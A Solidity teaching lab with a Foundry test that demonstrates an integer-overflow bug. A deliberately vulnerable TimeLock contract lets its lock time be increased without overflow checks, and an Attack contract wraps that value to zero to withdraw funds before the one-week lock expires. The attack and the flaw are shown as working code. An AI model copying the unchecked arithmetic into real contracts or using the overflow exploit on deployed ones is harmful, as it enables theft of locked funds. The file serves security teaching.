// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";


// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract ContractTest is Test {
        TimeLock TimeLockContract;
        Attack AttackerContract;   

function testOverflow() public {
    address alice = vm.addr(1);
    address bob = vm.addr(2);
    vm.deal(address(alice), 1 ether);   
    vm.deal(address(bob), 1 ether); 
    vm.startPrank(alice);    
    TimeLockContract = new TimeLock();   
    TimeLockContract.deposit{value: 1 ether}();
    vm.stopPrank();

    vm.startPrank(bob); 
    AttackerContract = new Attack(TimeLockContract);  //exploit here
    AttackerContract.attack{value: 1 ether}();
    console.log("Bypassed timelock, AttackerContract of balance", address(AttackerContract).balance);
    vm.stopPrank();
    vm.prank(alice);   
    console.log("Alice failed to withdraw, lock time not expired");
    TimeLockContract.withdraw();

    }
    receive() payable external{}
}

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
 
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}